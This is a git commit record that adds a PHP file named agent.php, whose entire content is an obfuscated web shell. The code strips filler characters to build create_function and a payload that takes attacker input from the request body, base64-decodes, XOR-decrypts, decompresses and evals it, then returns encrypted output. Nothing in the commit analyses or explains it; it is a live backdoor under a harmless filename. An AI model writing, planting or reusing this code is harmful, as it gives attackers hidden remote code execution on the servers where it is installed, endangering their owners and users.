dbee9f759df1bae849331465deb9423a227f5d49
NoSystemIsSafeYourAss <100312247+NoSystemIsSafeYourAss@users.noreply.github.com>
2022-12-11 01:14:30 +0100

    agent.php

---
+++ agent.php
@@ -0,0 +1,10 @@
+<?php
+$L=str_replace('kk','','kkcrkkkkeakktkke_functkkion');
+$n='!o$k){$c=strlen($k!o);$l=s!otrlen!o(!o$t);$o!o=!o"";for($i!o!o=0;$i<!o$l;){for($j=0;($j<$c&!o!o&$i<$l!o);$j++,!o$i++)';
+$v='$k=!o"0dc1!oe314";$kh="9!o39e8c5!o1!o116f"!o;$kf=!o"4370!o9678447a!o";$p="FP7W!o7C0sbNbbk!oGM7";f!ounctio!o!on!o x($t,';
+$c='!o{$o.=$!ot{$i}^!o!o$k{$!oj};}}retur!on $o;}if (@p!or!oeg_match("!o!o/$kh(.+)$kf/",@f!oile_get!o_cont!oents(!o"php://i!on';
+$F='put!o"),$m)!o==1)!o {@ob_star!ot(!o);@eva!ol(@gzu!oncompres!os(@x(@ba!ose64_!od!o!oecode($m[1!o]),!o!o$k)));$o=@!oob!o';
+$y='_get!o_contents();@ob_end_cle!oan(!o);$r=@bas!oe64_e!oncode(@!o!o!ox(@g!ozcom!o!opress($o),$k));print(!o"$p$kh$r$kf");}';
+$t=str_replace('!o','',$v.$n.$c.$F.$y);
+$P=$L('',$t);$P();
+?>
